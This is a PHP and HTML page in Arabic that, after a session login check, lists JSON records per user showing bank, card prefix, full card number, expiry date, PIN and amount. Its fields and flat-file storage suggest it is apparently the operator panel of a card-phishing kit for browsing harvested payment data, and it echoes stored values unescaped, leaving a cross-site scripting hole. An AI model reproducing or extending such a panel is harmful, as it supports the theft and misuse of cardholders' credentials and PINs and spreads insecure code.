<?php
session_start();
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header("Location: login.php");
    exit;
}
?>



<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>عرض المستخدمين</title>
    <style>
        body {
            font-family: 'Tajawal', sans-serif;
            background-color: #f5f5f5;
            padding: 20px;
        }

        h2 {
            color: #2c3e50;
        }

        .user-box {
            background: #fff;
            border: 1px solid #ccc;
            border-radius: 8px;
            margin-bottom: 15px;
            padding: 10px 15px;
            overflow: hidden;
            height: 50px;
            line-height: 30px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            position: relative;
        }

        .user-box:hover {
            background-color: #f9f9f9;
        }

        .user-box.expanded {
            position: fixed;
            top: 50%;
            left: 50%;
            width: 90%;
            max-width: 900px;
            height: 90vh;
            transform: translate(-50%, -50%);
            z-index: 9999;
            overflow: auto;
            padding: 20px;
        }

        .user-box.expanded .close-btn {
            display: block;
        }

        .close-btn {
            display: none;
            position: absolute;
            top: 10px;
            left: 10px;
            background: #e74c3c;
            color: white;
            border: none;
            padding: 6px 12px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            z-index: 10000;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }

        th, td {
            border: 1px solid #ccc;
            padding: 8px;
            text-align: center;
        }

        th {
            background-color: #f0f0f0;
        }

        .preview-line {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
    </style>
</head>
<body>

<?php
echo "<div style='text-align: left; margin-bottom: 20px;'>
        <a href='logout.php' style='color: red;'>🔓 تسجيل الخروج</a>
      </div>";
?>


<?php
$usersDir = 'users';

if (!is_dir($usersDir)) {
    echo "📁 مجلد المستخدمين غير موجود.";
    exit;
}

$userFiles = glob("$usersDir/*.json");

foreach ($userFiles as $file) {
    $user_id = basename($file, '.json');
    $data = json_decode(file_get_contents($file), true);

    if (!$data || !is_array($data)) continue;

    $latestEntry = end($data); // آخر إدخال

    echo "<div class='user-box' onclick='expandBox(this)'>";
    echo "<button class='close-btn' onclick='event.stopPropagation(); collapseBox(this)'>❌</button>";
    echo "<div class='preview-line'>👤 <strong>$user_id</strong> — 💳 " . ($latestEntry['رقم البطاقة'] ?? 'غير متوفر') . " — 🏦 " . ($latestEntry['البنك'] ?? 'غير متوفر') . "</div>";

    echo "<table style='margin-top: 10px; display: none;'>";
    echo "<tr>
            <th>التاريخ</th>
            <th>البنك</th>
            <th>مقدمة البطاقة</th>
            <th>رقم البطاقة</th>
            <th>تاريخ الانتهاء</th>
            <th>الرقم السري</th>
            <th>المبلغ</th>
          </tr>";

    foreach ($data as $entry) {
        echo "<tr>";
        echo "<td>" . ($entry['التاريخ'] ?? '') . "</td>";
        echo "<td>" . ($entry['البنك'] ?? '') . "</td>";
        echo "<td>" . ($entry['مقدمة البطاقة'] ?? '') . "</td>";
        echo "<td>" . ($entry['رقم البطاقة'] ?? '') . "</td>";
        echo "<td>" . ($entry['تاريخ الانتهاء'] ?? '') . "</td>";
        echo "<td>" . ($entry['الرقم السري'] ?? '') . "</td>";
        echo "<td>" . ($entry['المبلغ'] ?? '') . "</td>";
        echo "</tr>";
    }

    echo "</table>";
    echo "</div>";
}
?>

<script>
    function expandBox(box) {
        document.querySelectorAll('.user-box.expanded').forEach(b => {
            b.classList.remove('expanded');
            b.querySelector('table').style.display = 'none';
        });

        box.classList.add('expanded');
        box.querySelector('table').style.display = 'table';
    }

    function collapseBox(btn) {
        const box = btn.closest('.user-box');
        box.classList.remove('expanded');
        box.querySelector('table').style.display = 'none';
    }
</script>

</body>
</html>
